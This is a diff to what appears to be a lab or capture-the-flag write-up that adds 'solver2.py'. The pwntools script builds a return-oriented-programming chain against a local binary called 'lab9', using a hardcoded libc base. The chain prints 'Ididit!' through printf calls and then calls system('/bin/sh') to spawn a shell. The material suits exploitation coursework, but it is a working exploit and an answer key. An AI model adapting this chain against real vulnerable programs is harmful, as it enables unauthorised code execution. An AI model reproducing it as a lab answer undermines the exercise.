@@ -77,6 +77,55 @@ payload = padding + exploit
 sys.stdout.buffer.write(payload)
 ```
 
+`solver2.py`
+
+```py
+import sys
+from pwn import *
+
+context.log_level = 'CRITICAL'
+context.arch = 'i386'
+
+binary = ELF("lab9")
+libc = ELF("/usr/lib32/libc.so.6")
+
+libc_base = 0xf7d66000
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+
+I_addr = libc_base + next(libc.search(b'I'))
+d_addr = libc_base + next(libc.search(b'd'))
+i_addr = libc_base + next(libc.search(b'i'))
+t_addr = 0xf7d7e546  # Updated address for 't'
+exclamation_addr = libc_base + next(libc.search(b'!'))
+
+format_string = libc_base + next(libc.search(b'%s'))
+
+rop = ROP(binary)
+
+# Print each character in one line without newlines
+rop.call("printf", [format_string, I_addr])
+rop.call("printf", [format_string, d_addr])
+rop.call("printf", [format_string, i_addr])
+rop.call("printf", [format_string, d_addr])
+rop.call("printf", [format_string, i_addr])
+rop.call("printf", [format_string, t_addr])
+rop.call("printf", [format_string, exclamation_addr])
+
+# Move to the next line after the message
+rop.call("printf", [format_string, libc_base + next(libc.search(b'\n'))])
+
+# Call system to spawn a shell
+rop.call(system_addr, [bin_sh_addr])
+
+padding = b"a" * 22
+exploit = rop.chain()
+payload = padding + exploit
+
+sys.stdout.buffer.write(payload)
+```
+
+
 ```
 ./lab9 $(python3 solver.py)
 ```
